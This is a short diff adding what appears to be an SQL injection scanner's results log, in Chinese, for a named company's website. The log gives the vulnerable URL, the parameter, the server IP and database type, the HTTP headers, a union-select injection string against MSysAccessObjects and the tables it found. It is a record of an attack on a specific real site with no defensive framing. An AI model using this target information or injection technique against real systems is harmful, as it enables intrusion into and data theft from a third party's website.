@@ -1,0 +1,25 @@
+■漏洞信息:============================================================
+ ·URL:http://www.sfxjt.com/htm/news_ny.asp?newsid=63
+ ·页面标题：江苏三房巷集团有限公司
+ ·参数:newsid=63
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:117.79.93.242
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Tue, 23 Aug 2011 10:30:54 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 24042
+Content-Type: text/html
+Cache-control: private
+
+
+联合查询列数: 总共= 0  显示的列= 0
+联合查询SQL: and 3=8 union select  from MSysAccessObjects
+找到表:news
+找到表:News
